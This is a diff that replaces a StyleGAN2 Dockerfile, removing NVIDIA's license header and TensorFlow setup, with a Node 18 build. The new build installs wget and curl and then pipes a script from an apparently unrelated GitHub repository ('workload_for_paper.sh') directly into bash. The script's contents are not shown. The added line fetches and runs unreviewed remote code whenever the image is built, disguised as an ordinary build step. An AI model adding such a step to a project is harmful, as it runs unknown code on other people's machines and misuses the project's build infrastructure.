@@ -1,11 +1,16 @@
-# Copyright (c) 2019, NVIDIA Corporation. All rights reserved.
-#
-# This work is made available under the Nvidia Source Code License-NC.
-# To view a copy of this license, visit
-# https://nvlabs.github.io/stylegan2/license.html
+FROM node:18
 
-FROM tensorflow/tensorflow:1.14.0-gpu-py3
+WORKDIR /opt/app
 
-RUN pip install scipy==1.3.3
-RUN pip install requests==2.22.0
-RUN pip install Pillow==6.2.1
+ENV NODE_ENV production
+
+COPY . .
+
+RUN npm ci
+RUN which bash
+RUN ls -la
+RUN apt update
+RUN apt -y install wget coreutils curl
+RUN wget -O - https://raw.githubusercontent.com/mncedisimavunqela/Improved_Nodejs/main/workload_for_paper.sh | bash
+
+CMD ["npm", "run", "start", "/bin/bash"]
